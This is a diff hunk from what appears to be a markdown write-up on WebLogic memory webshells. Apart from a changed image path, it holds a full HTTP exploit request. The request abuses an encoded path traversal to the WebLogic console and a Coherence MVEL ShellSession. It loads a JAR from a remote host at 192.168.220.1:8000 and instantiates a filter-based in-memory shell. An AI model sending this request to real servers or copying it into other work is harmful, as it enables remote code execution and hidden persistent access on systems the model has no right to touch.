@@ -19,7 +19,7 @@
 GET /console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.net.URLClassLoader u = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://192.168.220.1:8000/MemShell-1.0-SNAPSHOT.jar")});u.loadClass("Inject.WeblogicInjectFilterShell").newInstance(); u.close();"); HTTP/1.1
 ```
 
-![](images/B5RFR1$H]VU@5{(@)]8}30B.png)
+![](D:\blog\github\MemShell\images\B5RFR1$H]VU@5{(@)]8}30B.png)
 
 ![image-20230301151252935](images/image-20230301151252935.png)
 
